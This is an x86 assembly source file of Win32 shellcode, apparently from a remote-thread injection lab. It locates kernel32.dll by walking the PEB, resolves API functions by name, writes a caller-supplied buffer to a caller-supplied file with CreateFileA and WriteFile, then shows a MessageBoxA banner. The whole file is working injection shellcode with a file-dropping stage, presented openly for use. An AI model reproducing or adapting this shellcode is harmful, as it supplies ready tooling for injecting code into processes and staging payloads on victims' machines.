;shellcode is taken from blackcloud and done few modification
;https://blackcloud.me/Win32-shellcode-1/
global _start

section .text
_start:
    ; stack frame
    push ebp
    mov ebp, esp
    mov edi, [ebp + 8]          ; XShellData
getkernel32:
	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov esi, edx                ; save getProcAddress in EBP for future purpose


getCreateFileA:
    xor ecx, ecx
    push ecx
    push 0x6141656C
    mov [esp+0x3],cl
    push 0x69466574
    push 0x61657243
    push esp                    ; CreateFileA
    push ebx                    ; kernel32 BaseAddress
    call esi                    ; GetProcAddress
callCreateFileA:
    xor ecx, ecx
    push ecx                    ; hTemplateFile
    push 0x80                   ; dwFlagsAndAttributes
    push 0x2                    ; dwCreationDisposition
    push ecx                    ; lpSecurityAttributes
    push ecx                    ; dwShareMode
    push 0x40000000             ; dwDesiredAccess
    push edi                    ; lpFileName
    call eax
    push eax

getWriteFile:
    xor ecx, ecx
    push ecx
    push 0x61616165
    mov [esp+0x1],cx
    mov [esp+0x3],cl
    push 0x6C694665
    push 0x74697257
    push esp                    ; WriteFile
    push ebx                    ; Kernel32
    call esi                    ; GetProcAddress
    add esp, 0x10

callWriteFile:
    lea ecx, [ebp + 0x20]      
    pop edx
    mov [ecx], edx              ; moving file handle to loc [edi + 0x108]
    xor ecx, ecx
    push ecx                    ; lpOverlapped
    push ecx                    ; lpNumberOfBytesWritten
    mov ecx, [edi + 0x104] 
    push ecx                    ; nNumberOfBytesToWrite
    mov ecx, [edi + 0x100]
    push ecx                    ; lpBuffer
    push edx                    ; hFile
    call eax                    ; WriteFile

GetCloseHandle:
    xor ecx, ecx
    push 0x00656C64
    mov [esp+0x3], cl
    push 0x6E614865
    push 0x736F6C43
    push esp
    push ebx
    call esi

CallCloseHandle:
    mov edx, [ebp + 0x20]
    push edx                    ; file handle
    call eax                    ; CloseHandle

getLoadLibraryA:
	xor ecx, ecx                ; zeroing ecx
	push ecx                    ; push 0 on stack
	push 0x41797261             ; 
	push 0x7262694c             ;  AyrarbiLdaoL
	push 0x64616f4c             ;
	push esp
	push ebx                    ; kernel32.dll
	call esi                    ; call GetProcAddress and find LoadLibraryA address
    push eax

	; EAX = LoadLibraryA address
	; EBX = Kernel32.dll address
	; EDX = GetProcAddress address 

getUser32:
    xor ecx, ecx
    push ecx
	push 0x61616c6c                 ;
	mov word [esp + 0x2], cx    ; aalld.23resU
	push 0x642e3233                 ; 
	push 0x72657355                 ; 
	push esp
	call eax                        ; call Loadlibrary and load User32.dll

GetMessageBoxA:
    xor ecx, ecx
    push ecx 
    push 0x6141786F
    mov [esp+0x3], cl
    push 0x42656761
    push 0x7373654D
    push esp                        ; MessageBoxA
    push eax                        ; user32dll BaseAddress
    call esi                        ; GetProcAddress

CallMessageBoxA:
    xor ecx, ecx
    push ecx
    push 0x61616164
    mov [esp+0x1], cx
    mov [esp+0x3], cx
    push 0x61657268
    push 0x54206574
    push 0x6F6D6552
    mov edi, esp                    ; message to show
    push 0x612E2121
    mov [esp + 0x3], cl
    push 0x7362614C	
    push 0x20657261	
    push 0x46726157	
    push 0x72656279	
    push 0x43206D6F	
    push 0x7246206F	
    push 0x6C6C6548
    mov  edx, esp
    push ecx
    push edi                        ; title
    push edx
    push ecx
    call eax
ret:
	xor		eax, eax
	pop		esi
	pop		ebx
    leave
	ret
